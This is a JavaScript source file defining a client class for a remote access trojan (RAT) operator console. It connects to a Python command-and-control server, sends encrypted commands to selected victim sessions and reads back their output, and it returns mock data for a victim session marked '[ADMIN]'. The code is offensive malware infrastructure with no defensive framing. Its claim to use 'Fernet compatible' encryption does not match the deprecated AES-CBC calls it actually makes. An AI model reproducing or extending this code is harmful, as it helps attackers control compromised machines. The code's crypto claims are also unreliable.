import net from 'net';
import crypto from 'crypto';

/**
 * RAT Server Client - Communicates with Python C2 server
 */

export class RATClient {
  constructor(host, port, encryptionKey) {
    this.host = host;
    this.port = port;
    this.encryptionKey = Buffer.from(encryptionKey, 'utf-8');
    this.currentSession = null;
    this.sessions = [];
    this.socket = null;
    this.connected = false;
  }

  /**
   * Connect to RAT server
   */
  async connect() {
    return new Promise((resolve, reject) => {
      this.socket = new net.Socket();
      
      this.socket.connect(this.port, this.host, () => {
        this.connected = true;
        console.log(`✓ Connected to RAT server at ${this.host}:${this.port}`);
        resolve();
      });

      this.socket.on('error', (err) => {
        this.connected = false;
        reject(err);
      });

      this.socket.on('close', () => {
        this.connected = false;
        console.log('✗ Disconnected from RAT server');
      });

      // Set timeout
      this.socket.setTimeout(60000);
    });
  }

  /**
   * Encrypt data (Fernet compatible)
   */
  encrypt(data) {
    // Simple encryption - in production use proper Fernet implementation
    const cipher = crypto.createCipher('aes-256-cbc', this.encryptionKey);
    let encrypted = cipher.update(data, 'utf8', 'base64');
    encrypted += cipher.final('base64');
    return encrypted;
  }

  /**
   * Decrypt data (Fernet compatible)
   */
  decrypt(data) {
    try {
      const decipher = crypto.createDecipher('aes-256-cbc', this.encryptionKey);
      let decrypted = decipher.update(data, 'base64', 'utf8');
      decrypted += decipher.final('utf8');
      return decrypted;
    } catch (error) {
      return data; // Return as-is if decryption fails
    }
  }

  /**
   * Send command to RAT
   */
  async sendCommand(sessionId, command, timeout = 30000) {
    if (!this.connected) {
      throw new Error('Not connected to RAT server');
    }

    return new Promise((resolve, reject) => {
      const encrypted = this.encrypt(command);
      
      // Send command
      this.socket.write(encrypted);

      // Wait for response
      const timer = setTimeout(() => {
        reject(new Error('Command timeout'));
      }, timeout);

      this.socket.once('data', (data) => {
        clearTimeout(timer);
        const decrypted = this.decrypt(data.toString());
        resolve(decrypted);
      });

      this.socket.once('error', (err) => {
        clearTimeout(timer);
        reject(err);
      });
    });
  }

  /**
   * Get session list
   */
  async getSessions() {
    // This would query the Python server for active sessions
    // For now, return mock data - you'll integrate with actual server
    return [
      {
        id: 1,
        addr: '192.168.1.100:54321',
        info: '[ADMIN] Connection from DESKTOP-ABC',
        connected_at: '10:30:15',
        active: true
      }
    ];
  }

  /**
   * Switch session
   */
  setActiveSession(sessionId) {
    this.currentSession = sessionId;
  }

  /**
   * Get current session
   */
  getCurrentSession() {
    return this.currentSession;
  }

  /**
   * Disconnect
   */
  disconnect() {
    if (this.socket) {
      this.socket.destroy();
      this.connected = false;
    }
  }
}